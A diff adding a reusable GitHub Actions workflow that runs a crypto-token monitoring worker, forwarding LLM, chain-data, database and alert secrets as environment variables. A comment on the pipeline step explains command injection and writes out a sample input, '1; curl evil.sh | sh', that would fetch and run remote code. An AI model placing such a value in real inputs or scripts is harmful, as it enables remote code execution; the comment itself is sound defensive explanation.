@@ -1,0 +1,148 @@
+name: Run lane
+
+# The one job both lanes run. provenance.yml (full run) and launches.yml
+# (launch lane) only choose when it fires and with which inputs; every secret
+# and variable the worker reads is forwarded here and nowhere else. The model
+# vars (LLM_*_MODEL) take `provider:model`, so switching vendor is a repo-var
+# change plus that provider's secret. A new provider's key is one line below.
+#
+# Callers pass `secrets: inherit`. GitHub never hands a job a secret the
+# workflow does not name, so the list below has to stay explicit.
+on:
+  workflow_call:
+    inputs:
+      lane:
+        description: 'Blank for the full run, or "launches"'
+        type: string
+        default: ''
+      dry_run:
+        type: boolean
+        default: false
+      limit:
+        type: string
+        default: ''
+      chains:
+        type: string
+        default: ''
+      browser:
+        description: 'Install Chromium for the DexTools source'
+        type: boolean
+        default: false
+      timeout_minutes:
+        type: number
+        default: 45
+      artifact_prefix:
+        type: string
+        required: true
+      retention_days:
+        type: number
+        default: 14
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: ${{ inputs.timeout_minutes }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: oven-sh/setup-bun@v2
+        with:
+          bun-version: latest
+
+      - name: Cache Bun install
+        uses: actions/cache@v4
+        with:
+          path: ~/.bun/install/cache
+          key: bun-${{ runner.os }}-${{ hashFiles('bun.lock') }}
+          restore-keys: bun-${{ runner.os }}-
+
+      - name: Install dependencies
+        run: bun install --frozen-lockfile
+
+      # The DexTools source drives a real browser; the other sources are plain
+      # HTTP and keep working if this step fails.
+      - name: Install Chromium
+        if: inputs.browser
+        run: bunx playwright install --with-deps chromium
+
+      - name: Migrate database
+        run: bun run apps/worker/src/cli.ts migrate
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
+
+      # Inputs reach the shell as env vars, never as `${{ }}` inside the
+      # script. Interpolation happens before bash sees the line, so a `limit` of
+      # `1; curl evil.sh | sh` would have been pasted in as a command. They are
+      # also quoted into an array rather than word-split out of one string.
+      - name: Run pipeline
+        run: |
+          set -o pipefail
+          args=(run)
+          [ -n "$INPUT_LANE" ] && args+=(--lane "$INPUT_LANE")
+          [ "$INPUT_DRY_RUN" = "true" ] && args+=(--dry-run)
+          [ -n "$INPUT_LIMIT" ] && args+=(--limit "$INPUT_LIMIT")
+          [ -n "$INPUT_CHAINS" ] && args+=(--chains "$INPUT_CHAINS")
+          bun run apps/worker/src/cli.ts "${args[@]}" 2>&1 | tee "$RUN_LOG"
+        env:
+          RUN_LOG: ${{ inputs.artifact_prefix }}.log
+          INPUT_LANE: ${{ inputs.lane }}
+          INPUT_DRY_RUN: ${{ inputs.dry_run }}
+          INPUT_LIMIT: ${{ inputs.limit }}
+          INPUT_CHAINS: ${{ inputs.chains }}
+          # LLM providers
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+          MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
+          DASHSCOPE_API_KEY: ${{ secrets.DASHSCOPE_API_KEY }}
+          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
+          OPENAI_COMPATIBLE_API_KEY: ${{ secrets.OPENAI_COMPATIBLE_API_KEY }}
+          OPENAI_COMPATIBLE_BASE_URL: ${{ secrets.OPENAI_COMPATIBLE_BASE_URL }}
+          # Models and spend
+          LLM_MODEL: ${{ vars.LLM_MODEL }}
+          LLM_EXTRACT_MODEL: ${{ vars.LLM_EXTRACT_MODEL }}
+          LLM_TRIAGE_MODEL: ${{ vars.LLM_TRIAGE_MODEL }}
+          LLM_PRICING: ${{ vars.LLM_PRICING }}
+          # The launch lane runs every 30 minutes, so it can carry its own
+          # ceiling; blank falls back to the shared one.
+          LLM_MAX_COST_USD_PER_RUN: ${{ inputs.lane == 'launches' && vars.LAUNCHES_MAX_COST_USD_PER_RUN || vars.LLM_MAX_COST_USD_PER_RUN }}
+          LLM_MAX_WEB_SEARCHES: ${{ vars.LLM_MAX_WEB_SEARCHES }}
+          # Chain data
+          ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
+          RPC_ETHEREUM: ${{ vars.RPC_ETHEREUM }}
+          # Storage and alert delivery
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+          ALERT_WEBHOOK_URL: ${{ secrets.ALERT_WEBHOOK_URL }}
+          ALERT_FILE_SINK: alerts.jsonl
+          # Full-run filters
+          MAX_TOKENS_PER_RUN: ${{ vars.MAX_TOKENS_PER_RUN }}
+          MIN_LIQUIDITY_USD: ${{ vars.MIN_LIQUIDITY_USD }}
+          MIN_VOLUME_24H_USD: ${{ vars.MIN_VOLUME_24H_USD }}
+          MIN_POOL_AGE_HOURS: ${{ vars.MIN_POOL_AGE_HOURS }}
+          REANALYSE_AFTER_HOURS: ${{ vars.REANALYSE_AFTER_HOURS }}
+          ALERT_SCORE_THRESHOLD: ${{ vars.ALERT_SCORE_THRESHOLD }}
+          PROVENANCE_CHAINS: ${{ vars.PROVENANCE_CHAINS }}
+          # Launch lane
+          LAUNCHES_LOOKBACK_HOURS: ${{ vars.LAUNCHES_LOOKBACK_HOURS }}
+          LAUNCHES_MAX_CATALOG_PER_RUN: ${{ vars.LAUNCHES_MAX_CATALOG_PER_RUN }}
+          LAUNCHES_MIN_LIQUIDITY_USD: ${{ vars.LAUNCHES_MIN_LIQUIDITY_USD }}
+          LAUNCHES_MIN_HOLDERS: ${{ vars.LAUNCHES_MIN_HOLDERS }}
+          LAUNCHES_RESEARCH_ANCHORED: ${{ vars.LAUNCHES_RESEARCH_ANCHORED }}
+          LOG_LEVEL: ${{ vars.LOG_LEVEL }}
+
+      # Uploaded even on failure: a failed run's log is the only record of why.
+      - name: Upload run artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ inputs.artifact_prefix }}-${{ github.run_id }}
+          path: |
+            ${{ inputs.artifact_prefix }}.log
+            alerts.jsonl
+          if-no-files-found: ignore
+          retention-days: ${{ inputs.retention_days }}
